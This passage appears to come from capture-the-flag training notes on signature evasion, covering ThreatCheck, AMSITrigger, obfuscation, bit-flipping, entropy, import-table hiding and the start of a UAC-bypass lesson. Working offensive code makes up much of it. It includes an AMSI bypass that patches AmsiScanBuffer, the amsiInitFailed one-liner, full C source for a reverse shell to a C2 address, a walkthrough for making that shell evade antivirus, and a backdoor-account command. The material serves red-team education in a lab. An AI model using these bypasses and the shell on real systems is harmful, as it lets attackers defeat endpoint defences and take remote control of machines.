	000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   ·"·I·V·"·:·"·{·3
	000000D0   00 7D 00 22 00 2C 00 22  00 45 00 6E 00 63 00 72   ·}·"·,·"·E·n·c·r
	000000E0   00 79 00 70 00 74 00 65  00 64 00 4D 00 65 00 73   ·y·p·t·e·d·M·e·s
	000000F0   00 73 00 61 00 67 00 65  00 22 00 3A 00 22 00 7B   ·s·a·g·e·"·:·"·{

```

It’s that simple! No other configuration or syntax is required and we
 can get straight to modifying our tooling. To efficiently use this tool
 we can identify any bad bytes that are first discovered then 
recursively break them and run the tool again until no signatures are 
identified.

Note: There may be instances of false positives, in which the tool 
will report no bad bytes. This will require your own intuition to 
observe and solve; however, we will discuss this further in task 4.

---

# AMSITrigger

As covered in [Runtime Detection Evasion](https://tryhackme.com/room/runtimedetectionevasion), AMSI
 leverages the runtime, making signatures harder to identify and 
resolve. ThreatCheck also does not support certain file types such as 
PowerShell that AMSITrigger does.

AMSITrigger
 will leverage the AMSI engine and scan functions against a provided 
PowerShell script and report any specific sections of code it believes 
need to be alerted on.

AMSITrigger does provide a pre-compiled release on their GitHub and can also be found on the Desktop of the attached machine.

Below is the syntax usage of AMSITrigger

AMSITrigger Help Menu

```powershell
C:\>amsitrigger.exe --help
	-i, --inputfile=VALUE       Powershell filename
	-u, --url=VALUE             URL eg. <https://10.1.1.1/Invoke-NinjaCopy.ps1>
	-f, --format=VALUE          Output Format:
	                              1 - Only show Triggers
	                              2 - Show Triggers with Line numbers
	                              3 - Show Triggers inline with code
	                              4 - ShowAMSI calls (xmas tree mode)
	-d, --debug                 Show Debug Info
	-m, --maxsiglength=VALUE    Maximum signature Length to cater for,
	                              default=2048
	-c, --chunksize=VALUE       Chunk size to send to AMSIScanBuffer,
	                              default=4096
	-h, -?, --help              Show Help

```

For our uses we only need to supply a file and the preferred format to report signatures.

AMSI Trigger Example

```html
PS C:\> .\amsitrigger.exe -i bypass.ps1 -f 3
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

In the next task we will discuss how you can use the information gathered from these tools to break signatures.

**Static Code-Based Signatures**

Once we 
have identified a troublesome signature we need to decide how we want to
 deal with it. Depending on the strength and type of signature, it may 
be broken using simple obfuscation as covered in [Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples),
 or it may require specific investigation and remedy. In this task, we 
aim to provide several solutions to remedy static signatures present in 
functions.

The [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf) covers the most reliable solutions as part of the **Obfuscating Methods** and **Obfuscating Classes** layer.

# Obfuscating methods

| **Obfuscation Method** | **Purpose** |
| --- | --- |
| Method Proxy | Creates a proxy method or a replacement object |
| Method Scattering/Aggregation | Combine multiple methods into one or scatter a method into several |
| Method Clone | Create replicas of a method and randomly call each |

# Obfuscating Classes

| **Obfuscation Method** | **Purpose** |
| --- | --- |
| Class Hierarchy Flattening | Create proxies for classes using interfaces |
| Class Splitting/Coalescing | Transfer local variables or instruction groups to another class |
| Dropping Modifiers | Remove class modifiers (public, private) and make all members public |

Looking
 at the above tables, even though they may use specific technical terms 
or ideas, we can group them into a core set of agnostic methods 
applicable to any object or data structure.

The techniques **class splitting/coalescing** and **method scattering/aggregation** can be grouped into an overarching concept of splitting or merging any given **OOP** (**O**bject-**O**riented **P**rogramming) function.

Other techniques such as **dropping modifiers** or **method clone** can be grouped into an overarching concept of removing or obscuring identifiable information.

---

# Splitting and Merging Objects

The methodology required to split or merge objects is very similar to the objective of concatenation as covered in [Obfuscation Principles.](https://tryhackme.com/room/signatureevasion)

The
 premise behind this concept is relatively easy, we are looking to 
create a new object function that can break the signature while 
maintaining the previous functionality.

To provide a more concrete example of this, we can use the [well-known case study](https://offensivedefence.co.uk/posts/covenant-profiles-templates/) in Covenant present in the `GetMessageFormat` string. We will first look at how the solution was implemented then break it down and apply it to the obfuscation taxonomy.

**Original String**

Below is the original string that is detected

```csharp
string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2},""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

```

**Obfuscated Method**

Below is the new class used to replace and concatenate the string.

```csharp
public static string GetMessageFormat // Format the public method
{
    get // Return the property value
    {
        var sb = new StringBuilder(@"{{""GUID"":""{0}"","); // Start the built-in concatenation method
        sb.Append(@"""Type"":{1},"); // Append substrings onto the string
        sb.Append(@"""Meta"":""{2}"",");
        sb.Append(@"""IV"":""{3}"",");
        sb.Append(@"""EncryptedMessage"":""{4}"",");
        sb.Append(@"""HMAC"":""{5}""}}");
        return sb.ToString(); // Return the concatenated string to the class
    }
}

string MessageFormat = GetMessageFormat

```

Recapping this case study, class splitting is used to create a 
new class for the local variable to concatenate. We will cover how to 
recognize when to use a specific method later in this task and 
throughout the practical challenge.

---

# Removing and Obscuring Identifiable Information

The core concept behind removing identifiable information is similar to obscuring variable names as covered in [Obfuscation Principles](https://tryhackme.com/room/signatureevasion).
 In this task, we are taking it one step further by specifically 
applying it to identified signatures in any objects including methods 
and classes.

An example of this can be found in Mimikatz where an alert is generated for the string `wdigest.dll`.
 This can be solved by replacing the string with any random identifier 
changed throughout all instances of the string. This can be categorized 
in the obfuscation taxonomy under the method proxy technique.

This is almost no different than as discussed in [Obfuscation Principles](https://tryhackme.com/room/signatureevasion); however, it is applied to a specific situation.

---

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet, using AmsiTrigger to visual signatures.

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

Once sufficiently obfuscated, submit the snippet to the webserver at `http://MACHINE_IP/challenge-1.html`. The file name must be saved as `challenge-1.ps1`. If correctly obfuscated a flag will appear in an alert pop-up

**Static Property-Based Signatures**

Various detection
 engines or analysts may consider different indicators rather than 
strings or static signatures to contribute to their hypothesis. 
Signatures can be attached to several file properties, including file 
hash, entropy,
 author, name, or other identifiable information to be used individually
 or in conjunction. These properties are often used in rule sets such as
 **YARA** or **Sigma**.

Some properties may be easily manipulated, while others can be more 
difficult, specifically when dealing with pre-compiled closed-source 
applications.

This task will discuss manipulating the **file hash** and **entropy** of both open-source and closed-source applications.

Note: several other properties such as PE
 headers or module properties can be used as indicators. Because these 
properties often require an agent or other measures to detect, we will 
not cover them in this room to keep the focus on signatures.

---

# File Hashes

A **file hash**, also known as a **checksum**,
 is used to tag/identify a unique file. They are commonly used to verify
 a file’s authenticity or its known purpose (malicious or not). File 
hashes are generally arbitrary to modify and are changed due to any 
modification to the file.

If we have access to the source for an application, we can modify any
 arbitrary section of the code and re-compile it to create a new hash. 
That solution is straightforward, but what if we need a pre-compiled or 
signed application?

When dealing with a signed or closed-source application, we must employ **bit-flipping**.

Bit-flipping is a common cryptographic attack that will mutate a 
given application by flipping and testing each possible bit until it 
finds a viable bit. By flipping one viable bit, it will change the 
signature and hash of the application while maintaining all 
functionality.

We can use a script to create a **bit-flipped list** by flipping each bit and creating a new **mutated variant** (~3000 - 200000 variants). Below is an example of a python bit-flipping implementation.

```python
import sys

orig = list(open(sys.argv[1], "rb").read())

i = 0
while i < len(orig):
	current = list(orig)
	current[i] = chr(ord(current[i]) ^ 0xde)
	path = "%d.exe" % i

	output = "".join(str(e) for e in current)
	open(path, "wb").write(output)
	i += 1

print("done")

```

Once the list is created, we must search for intact unique properties of the file. For example, if we are bit-flipping `msbuild`, we need to use `signtool`
 to search for a file with a useable certificate. This will guarantee 
that the functionality of the file is not broken, and the application 
will maintain its signed attribution.

We can leverage a script to loop through the bit-flipped list and 
verify functional variants. Below is an example of a batch script 
implementation.

```powershell
FOR /L %%A IN (1,1,10000) DO (
	signtool verify /v /a flipped\\%%A.exe
)

```

This technique can be very lucrative, although it can take a long 
time and will only have a limited period until the hash is discovered. 
Below is a comparison of the original MSBuild application and the 
bit-flipped variation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ab3f859f9dc34e6c4b41fe3437b2396d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ab3f859f9dc34e6c4b41fe3437b2396d.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3adf6b9caad98324a399a2a00775e37c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3adf6b9caad98324a399a2a00775e37c.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3e4c0050212e7c69d408135de36976a3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3e4c0050212e7c69d408135de36976a3.png)

---

# Entropy

From [IBM](https://www.ibm.com/docs/en/qsip/7.4?topic=content-analyzing-files-embedded-malicious-activity),
 Entropy is defined as “the randomness of the data in a file used to 
determine whether a file contains hidden data or suspicious scripts.” 
EDRs and other scanners often leverage entropy to identify potential suspicious files or contribute to an overall malicious score.

Entropy
 can be problematic for obfuscated scripts, specifically when obscuring 
identifiable information such as variables or functions.

To lower entropy, we can replace random identifiers with randomly selected English words. For example, we may change a variable from `q234uf` to `nature`.

To prove the efficacy of changing identifiers, we can observe how the entropy changes using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Entropy('Shannon%20scale')).

Below is the Shannon entropy scale for a standard English paragraph.

**Shannon entropy: 4.587362034903882**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/96630d6dbe47ad3204cc121e9b5bf84e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/96630d6dbe47ad3204cc121e9b5bf84e.png)

Below is the Shannon entropy scale for a small script with random identifiers.

**Shannon entropy: 5.341436973971389**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/92db2f5431d34098678bbcbf8170af52.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/92db2f5431d34098678bbcbf8170af52.png)

Depending on the EDR employed, a “suspicious” entropy value is ~ greater than 6.8.

The difference between a random value and English text will become amplified with a larger file and more occurrences.

Note that entropy will generally never be used alone and only to support a hypothesis. For example, the entropy for the command `pskill` and the hivenightmare exploit are almost identical.

To see entropy in action, let’s look at how an EDR would use it to contribute to threat indicators.

In the white paper, [An Empirical Assessment of Endpoint Detection and Response Systems against  Advanced Persistent Threats Attack Vectors](https://www.mdpi.com/2624-800X/1/3/21/pdf)*,* **SentinelOne** *is shown to detect a DLL due to high entropy, specifically through AES encryption.*

**Behavioral Signatures**

Obfuscating
 functions and properties can achieve a lot with minimal modification. 
Even after breaking static signatures attached to a file, modern engines
 may still observe the behavior and functionality of the binary. This 
presents numerous problems for attackers that cannot be solved with 
simple obfuscation.

As covered in [Introduction to Anti-Virus](https://tryhackme.com/room/introtoav),
 modern anti-virus engines will employ two common methods to detect 
behavior: observing imports and hooking known malicious calls. While 
imports, as will be covered in this task, can be easily obfuscated or 
modified with minimal requirements, hooking requires complex techniques 
out of scope for this room. Because of the prevalence of API
 calls specifically, observing these functions can be a significant 
factor in determining if a file is suspicious, along with other 
behavioral tests/considerations.

Before diving too deep into rewriting or importing calls, let’s discuss how API
 calls are traditionally utilized and imported. We will cover C-based 
languages first and then briefly cover .NET-based languages later in 
this task.

API
 calls and other functions native to an operating system require a 
pointer to a function address and a structure to utilize them.

Structures for functions are simple; they are located in **import libraries** such as `kernel32` or `ntdll` that store function structures and other core information for Windows.

The
 most significant issue to function imports is the function addresses. 
Obtaining a pointer may seem straightforward, although because of **ASLR** (**A**ddress **S**pace **L**ayout **R**andomization), function addresses are dynamic and must be found.

Rather than altering code at runtime, the **Windows loader** `windows.h`
 is employed. At runtime, the loader will map all modules to process 
address space and list all functions from each. That handles the 
modules, but how are function addresses assigned?

One of the most critical functions of the Windows loader is the **IAT (I**mport **A**ddress **T**able). The IAT will store function addresses for all imported functions that can assign a pointer for the function.

The IAT is stored in the **PE** (**P**ortable **E**xecutable) header `IMAGE_OPTIONAL_HEADER` and is filled by the Windows loader at runtime. The Windows loader obtains the function addresses or, more precisely, **thunks** from a pointer table, accessed from an API call or **thunk table**. Check out the [Windows Internals room](https://tryhackme.com/room/windowsinternals) for more information about the PE structure.

At a glance, an API
 is assigned a pointer to a thunk as the function address from the 
Windows loader. To make this a little more tangible, we can observe an 
example of the PE dump for a function.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/0d4ba9ba4348b53036cb2127f4968e87.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/0d4ba9ba4348b53036cb2127f4968e87.png)

---

The import table can provide a lot of insight into the functionality 
of a binary that can be detrimental to an adversary. But how can we 
prevent our functions from appearing in the IAT if it is required to 
assign a function address?

As briefly mentioned, the thunk table is not the only way to obtain a pointer for a function address. We can also utilize an API call to obtain the function address from the import library itself. This technique is known as **dynamic loading** and can be used to avoid the IAT and minimize the use of the Windows loader.

We will write our structures and create new arbitrary names for functions to employ dynamic loading.

At a high level, we can break up dynamic loading in C languages into four steps,

1. Define the structure of the call
2. Obtain the handle of the module the call address is present in
3. Obtain the process address of the call
4. Use the newly created call

To begin dynamically loading an API
 call, we must first define a structure for the call before the main 
function. The call structure will define any inputs or outputs that may 
be required for the call to function. We can find structures for a 
specific call on the Microsoft documentation. For example, the structure
 for `GetComputerNameA` can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea).
 Because we are implementing this as a new call in C, the syntax must 
change a little, but the structure stays the same, as seen below.

```cpp
// 1. Define the structure of the call
typedef BOOL (WINAPI* myNotGetComputerNameA)(
	LPSTR   lpBuffer,
	LPDWORD nSize
);
```

To access the address of the API call, we must first load the library where it is defined. We will define this in the main function. This is commonly `kernel32.dll` or `ntdll.dll` for any Windows API calls. Below is an example of the syntax required to load a library into a module handle.

```cpp
// 2. Obtain the handle of the module the call address is present in
HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
```

Using the previously loaded module, we can obtain the process address for the specified API call. This will come directly after the `LoadLibrary`
 call. We can store this call by casting it along with the previously 
defined structure. Below is an example of the syntax required to obtain 
the API call.

```c
// 3. Obtain the process address of the call
myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, "GetComputerNameA");
```

Although this method solves many concerns and problems, there are still several considerations that must be noted. Firstly, `GetProcAddress` and `LoadLibraryA`
 are still present in the IAT; although not a direct indicator it can 
lead to or reinforce suspicion; this problem can be solved using **PIC** (**P**osition **I**ndependent **C**ode). Modern agents will also hook specific functions and monitor kernel interactions; this can be solved using **API unhooking**.

---

Using the knowledge you have accrued throughout this task, obfuscate the following C snippet, ensuring no suspicious API calls are present in the IAT.

```c
#include <windows.h>#include <stdio.h>#include <lm.h>int main() {
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (GetComputerNameA(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```

**Putting It All Together**

As reiterated through both this room and [Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples), no one method will be 100% effective or reliable.

To create a more effective and reliable methodology, we can combine 
several of the methods covered in this room and the previous.

When determining what order you want to begin obfuscation, consider 
the impact of each method. For example, is it easier to obfuscate an 
already broken class or is it easier to break a class that is 
obfuscated?

Note: In general, You should run automated obfuscation or less 
specific obfuscation methods after specific signature breaking, however,
 you will not need those techniques for this challenge.

Taking these notes into consideration, modify the provided binary to meet the specifications below.

1. No suspicious library calls present
2. No leaked function or variable names
3. File hash is different than the original hash
4. Binary bypasses common anti-virus engines

Note: When considering library calls and leaked function, be conscious of the IAT table and strings of your binary.

```c
#include <winsock2.h>#include <windows.h>#include <ws2tcpip.h>#include <stdio.h>#define DEFAULT_BUFLEN 1024void RunShell(char* C2Server, int C2Port) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";
        int port = 53;
        RunShell(host, port);
    }
    return 0;
}
```

Once sufficiently obfuscated, compile the payload on the AttackBox or VM of your choice using GCC or other C compiler. The file name must be saved as `challenge.exe`. Once compiled, submit the executable to the webserver at `http://MACHINE_IP/`[.](http://machine_ip/) If your payload satisfies the requirements listed, it will be ran and a beacon will be sent to the provided server IP and port.

Note: It is also essential to change the `C2Server` and `C2Port` variables in the provided payload or this challenge will not properly work and you will not receive a shell back.

Note: When compiling with GCC you will need to add compiler options for `winsock2` and `ws2tcpip`. These libraries can be included using the compiler flags `-lwsock32` and `-lws2_32`

If you are still stuck we have provided a walkthrough of the solution below.

*Solution Walkthrough (Click to read)*
For
 this challenge, we are given a binary we did not create. Our first goal
 is to get familiar with the binary from a reverse engineer’s 
perspective. Are there any signatures? What does its PE structure look like? Is there any critical information in the IAT?
If you run the binary against ThreatCheck or a similar tool, you will
 notice it currently has no detections, so we can move on from that.
If you inspect the binaries IAT table as discussed in task 6, you will notice there are roughly seven unique API calls that could indicate the objectives of this binary.
Let’s focus our efforts on removing these from the IAT table 
and dynamically calling them. To recap what was covered in task 6: we 
need to identify a specific API call, obtain its structure from the [Windows documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list), load the library for the API calls, and obtain a pointer to the API call.
We’ll walk through dynamically calling one API call and then expect you to reiterate the steps for the rest of the calls.
Let’s look at the [Windows document](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect) for `WSAConnect`; below is the structure obtained from the documentation

`int WSAAPI WSAConnect(
  [in]  SOCKET         s,
  [in]  const sockaddr *name,
  [in]  int            namelen,
  [in]  LPWSABUF       lpCallerData,
  [out] LPWSABUF       lpCalleeData,
  [in]  LPQOS          lpSQOS,
  [in]  LPQOS          lpGQOS
);`

We can now rewrite this to meet the requirements of a structure definition.

`typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);`

Now we need to import the library the calls are stored in. This only needs to occur once since all calls use the same library.

`HMODULE hws2_32 = LoadLibraryW(L"ws2_32");`

To use the API call, we must obtain the pointer to the address.

`WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");`

Once the pointer is obtained, we can change all occurrences of the API call with our new pointer.

`mySocket = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);`

Once complete, your structure definition should look like the below code snippet

`typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);`

The below code snippet defines all pointer addresses needed, corresponding to the above structures.

`HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup");` 
Please
 note, the structure definitions should be outside of any function at 
the beginning of your code. The pointer definitions should be at the top
 of the `RunShell` function
We should now randomize the
 pointer and other variable names in proper best practice. We should 
also strip the binary of any symbols or other identifiable information.
Once thoroughly obfuscated and information has been removed we can compile the binary using `mingw-gcc`.

`x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32`

## **BYPASSING UAC**

User Account Control (UAC)

### What is UAC?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4c9e08e46fb545bd16f1c648e2956a34.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4c9e08e46fb545bd16f1c648e2956a34.png)

User Account Control (

UAC

)
 is a Windows security feature that forces any new process to run in the
 security context of a non-privileged account by default. This policy 
applies to processes started by any user, including administrators 
themselves. The idea is that we can't solely rely on the user's identity
 to determine if some actions should be authorized.

Although this may seem counterintuitive, imagine the case where
 user BOB unknowingly downloads a malicious application from the 
Internet. If BOB is a part of the Administrators group, any application 
he launches will inherit its access token privileges. So if BOB decides 
to launch the malicious application and UAC
 is disabled, the malicious application would gain administrator 
privileges instantly. Instead, the malicious application will be 
restricted to a non-administrative access token when UAC is enabled.

### UAC Elevation

If an administrator is required to perform a privileged task, UAC provides a way to elevate privileges. **Elevation**
 works by presenting a simple dialogue box to the user to confirm that 
they explicitly approve running the application in an administrative 
security context:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8088062c5a8e61407d343186bba02596.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8088062c5a8e61407d343186bba02596.png)

### Integrity Levels

UAC is a **Mandatory Integrity Control (MIC)**, which is a mechanism that allows differentiating users, processes and resources by assigning an **Integrity Level (IL)**
 to each of them. In general terms, users or processes with a higher IL 
access token will be able to access resources with lower or equal ILs. 
MIC takes precedence over regular Windows DACLs, so you may be authorized to access a resource according to the DACL, but it won't matter if your IL isn't high enough.

The following 4 ILs are used by Windows, ordered from lowest to highest:

| **Integrity Level** | **Use** |
| --- | --- |
| Low | Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions. |
| Medium | Assigned to standard users and Administrators' filtered tokens. |
| High | Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token. |
| System | Reserved for system use. |

When
 a process requires to access a resource, it will inherit the calling 
user's access token and its associated IL. The same occurs if a process 
forks a child.

### Filtered Tokens

To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:

- **Non-administrators** will receive a single access
token when logged in, which will be used for all tasks performed by the
user. This token has Medium IL.
- **Administrators** will receive two access tokens:
    - **Filtered Token:** A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.
    - **Elevated Token:** A token with full Administrator
    privileges, used when something needs to be run with administrative
    privileges. This token has High IL.

In this way, administrators will use their filtered token unless they explicitly request administrative privileges via UAC.

### Opening an Application the Usual Way

When trying to open a regular console, we can either open it as a 
non-privileged user or as an administrator. Depending on our choice, 
either a Medium or High integrity level token will be assigned to the 
spawned process:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/85532945ffd962373592d21f1720ee39.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/85532945ffd962373592d21f1720ee39.png)

If we analyze both processes using Process Hacker, we can see the associated tokens and their differences :

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/605235aa87c2f39689d0396bb3603967.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/605235aa87c2f39689d0396bb3603967.png)

On
 the left, you have a filtered token with medium IL and almost no 
privileges assigned. On the right, you can see that the process runs 
with high IL and has many more privileges available. Another difference 
that may not be so obvious is that the medium IL process is effectively 
denied any privileges related to being part of the Administrators group.

### UAC Settings

Depending on our security requirements, UAC can be configured to run at four different notification levels:

- **Always notify:** Notify and prompt the user for authorization when making changes to
Windows settings or when a program tries to install applications or make changes to the computer.
- **Notify me only when programs try to make changes to my computer:** Notify and prompt the user for authorization when a program tries to
install applications or make changes to the computer. Administrators
won't be prompted when changing Windows settings.
- **Notify me only when programs try to make changes to my computer (do not dim my desktop):** Same as above, but won't run the UAC prompt on a secure desktop.
- **Never notify:** Disable UAC prompt. Administrators will run everything using a high privilege token.

By default, UAC is configured on the **Notify me only when programs try to make changes to my computer** level:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/143a6c0fd6725edaee0f3d5c707e97f0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/143a6c0fd6725edaee0f3d5c707e97f0.png)

From
 an attacker's perspective, the three lower security levels are 
equivalent, and only the Always notify setting presents a difference.

### UAC Internals

At the heart of UAC, we have the **Application Information Service** or **Appinfo**. Whenever a user requires elevation, the following occurs:

1. The user requests to run an application as administrator.
2. A **ShellExecute** API call is made using the **runas** verb.
3. The request gets forwarded to Appinfo to handle elevation.
4. The application manifest is checked to see if AutoElevation is allowed (more on this later).
5. Appinfo executes **consent.exe**, which shows the UAC prompt on a **secure desktop**. A secure desktop is simply a separate desktop that isolates processes
from whatever is running in the actual user's desktop to avoid other
processes from tampering with the UAC prompt in any way.
6. If the user gives consent to run the application as administrator, the
Appinfo service will execute the request using a user's Elevated Token.
Appinfo will then set the parent process ID of the new process to point
to the shell from which elevation was requested.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fce906f0e438efa938753430e5d25afe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fce906f0e438efa938753430e5d25afe.png)

### Bypassing UAC

From an attacker's perspective, there might be situations where you 
get a remote shell to a Windows host via Powershell or cmd.exe. You 
might even gain access through an account that is part of the 
Administrators group, but when you try creating a backdoor user for 
future access, you get the following error:

Powershell

```
PS C:\Users\attacker> net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.
```

By checking our assigned groups, we can 
confirm that our session is running with a medium IL, meaning we are 
effectively using a filtered token:

Powershell

```
PS C:\Users\attacker> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Attributes
============================================================= ==================================================
Everyone                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Group used for deny only
BUILTIN\Administrators                                        Group used for deny only
BUILTIN\Users                                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level
```

Even when we get a Powershell session with an administrative user, UAC
